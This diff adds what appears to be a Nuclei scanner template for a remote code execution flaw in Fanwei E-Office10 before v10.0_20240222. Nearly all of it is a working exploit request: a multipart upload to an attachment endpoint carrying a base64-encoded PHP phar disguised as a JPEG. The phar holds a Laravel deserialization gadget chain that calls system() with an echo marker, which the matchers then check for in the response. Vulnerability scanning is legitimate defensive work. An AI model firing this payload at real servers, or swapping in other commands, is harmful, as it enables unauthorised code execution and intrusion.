@@ -1,0 +1,42 @@
+id: fanweiOA-E-Office10-RCE
+
+info:
+  name: 泛微E-Office10版本小于存在远程代码执行漏洞
+  author: cnaq
+  severity: high  
+  description: 泛微E-Office10版本小于v10.0_20240222存在远程代码执行漏洞
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E6%B3%9B%E5%BE%AEE-Office10%E7%89%88%E6%9C%AC%E5%B0%8F%E4%BA%8Ev10.0_20240222%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+    - https://mp.weixin.qq.com/s/zFQ1DZZojm3ww1jq0ReVhw
+  tags: rce,ecology,fanwei,oa
+
+
+requests:
+  - raw:
+      - |
+        POST /eoffice10/server/public/api/attachment/atuh-file HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+        Content-Length: 523
+        Accept: string("*/*")
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=ifedjiqy
+
+        --ifedjiqy
+        Content-Disposition: form-data; name="Filedata"; filename="register.inc"
+        Content-Type: image/jpeg
+
+        {{base64_decode("PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+CiQBAREB7oCATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIqZXZlbnRzIjtPOjI1OiJJbGx1bWluYXRlXEJ1c1xEaXNwYXRjaGVyIjoxOntzOjE2OiIqcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IipldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6NjoiZWNobyAzZWRjNHJmdiI7fX0IdGVzdC50eHQFKh9hBemPsQF0ZXNhdOWkpjdI456oPuyQrFDfunfkgoBHQk1C")}}
+        --ifedjiqy--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: regex
+        part: body
+        regex:
+          - '3edc4rfv'
+
